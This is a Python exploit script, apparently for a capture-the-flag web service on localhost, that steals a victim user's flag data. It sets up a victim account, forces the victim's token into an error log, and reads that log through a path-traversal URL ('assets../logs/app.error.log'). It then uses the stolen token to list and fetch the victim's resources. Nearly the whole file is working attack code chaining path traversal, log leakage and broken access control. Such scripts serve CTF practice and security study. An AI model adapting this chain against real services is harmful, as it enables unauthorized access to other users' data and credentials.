import base64
import random
import string

import requests


ALP = string.ascii_letters + string.digits


def gen_str(a=0, b=20):
    return ''.join(random.choice(ALP) for _ in range(a, b))


def fill_user_data():
    username = 'user_' + gen_str()
    print('victim username', username)
    data = {
        'username': username,
        'password': gen_str()
    }
    url = 'http://localhost:8080/register'
    r = requests.post(url, json=data)
    print(r)
    print(r.cookies)

    url = 'http://localhost:8080/login'
    # data['username'] = '123'
    r = requests.post(url, json=data)
    print(r)
    print(r.cookies)

    cookies = r.cookies

    url = 'http://localhost:8080/issue_token'
    r = requests.post(url, json={}, cookies=cookies)
    print(r)
    print(r.json())
    token0 = r.json()['token']
    print('victim token: ', token0)

    url = 'http://localhost:8080/issue_token'
    r = requests.post(url, json={}, cookies=cookies)
    print(r)
    print(r.json())
    token1 = r.json()['token']

    for _ in range(3):
        url = 'http://localhost:8080/create_resource'
        data = {
            'name': 'name',
            'token': token0,
            'b64blob': base64.b64encode(('FLAG_' + gen_str()).encode()).decode()
        }
        r = requests.post(url, json=data, cookies=cookies)
    return cookies, username


def main():
    victim_cookies, victim_username = fill_user_data()
    username = 'hacker_' + gen_str()
    data = {
        'username': username,
        'password': gen_str()
    }
    url = 'http://localhost:8080/register'
    r = requests.post(url, json=data)
    cookies = r.cookies

    url = 'http://localhost:8080/grant_access'
    data = {
        'username': victim_username,
        'token': 'token0',
        'resource_id': 'ne-res',
    }
    r = requests.post(url, json=data, cookies=cookies)
    print(r)
    print(r.json())

    url = 'http://localhost:8080/issue_token'
    r = requests.post(url, json={}, cookies=cookies)
    print(r)
    print(r.json())
    hacker_token = r.json()['token']

    url = 'http://localhost:8080/create_resource'
    data = {
        'name': 'name',
        'token': hacker_token,
        'b64blob': base64.b64encode(('FLAG_' + gen_str()).encode()).decode()
    }
    r = requests.post(url, json=data, cookies=cookies)
    print(r)
    print(r.json())
    resource_id = r.json()['resource_id']

    victim_resource_id = str(int(resource_id) - 1)
    print('resource_id', resource_id)

    # return
    url = 'http://localhost:8080/remove_resource'
    data = {
        'username': victim_username,
        'resource_id': victim_resource_id,
    }

    # input('remove!')
    try:
        r = requests.post(url, json=data, cookies=cookies)
        print(r)
        print(r.json())
    except Exception:
        pass

    try:
        url = 'http://localhost:8080/list_resources'
        r = requests.get(url, json={}, cookies=victim_cookies)
        print(r)
        print(r.json())
    except Exception:
        pass

    url = 'http://localhost:8080/assets../logs/app.error.log'
    r = requests.get(url, json={}, cookies=cookies)
    print(r)
    victim_token = r.text.split()[-1].strip("'")

    # return
    url = 'http://localhost:8080/list_resources_by_token?username={}&token={}'.format(victim_username, victim_token)
    r = requests.get(url)
    print(r)
    print(r.content)
    print(r.json())

    for victim_resource in r.json()['resources']:
        try:
            victim_resource_id = victim_resource['id']
            url = 'http://localhost:8080/get_resource?username={}&token={}&resource_id={}'.format(victim_username, victim_token, victim_resource_id)
            r = requests.get(url)
            print(r)
            print(r.json())
        except Exception:
            pass


if __name__ == '__main__':
    main()
